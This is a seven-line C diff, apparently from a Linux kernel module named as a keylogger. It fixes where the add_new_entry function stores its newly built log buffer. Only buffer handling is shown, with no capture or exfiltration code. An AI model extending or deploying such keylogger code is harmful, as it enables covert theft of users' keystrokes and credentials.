@@ -49,7 +49,7 @@ static int add_new_entry(char *entry)
 	strcat(tmp_buff, entry);
 	if (keylogger_data.log_buffer)
 		vfree(keylogger_data.log_buffer);
-	log_buffer = tmp_buff;
+	keylogger_data.log_buffer = tmp_buff;
 	return (0);
 }
 
